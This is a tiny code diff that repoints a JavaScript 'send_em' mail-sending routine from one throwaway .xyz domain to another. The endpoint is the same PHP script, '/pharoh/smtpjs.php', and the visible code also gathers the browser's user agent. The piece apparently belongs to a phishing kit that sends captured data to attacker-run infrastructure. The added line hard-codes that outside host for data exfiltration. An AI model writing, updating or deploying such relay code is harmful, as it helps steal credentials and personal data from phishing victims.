@@ -1,4 +1,4 @@
-var yourUrl ="https://xzawwree.xyz/pharoh/smtpjs.php";
+var yourUrl ="https://kjkjkalao.xyz/pharoh/smtpjs.php";
         async function send_em(to,from,subject,body){
             let agent = navigator.userAgent;
             var xhr = new XMLHttpRequest();
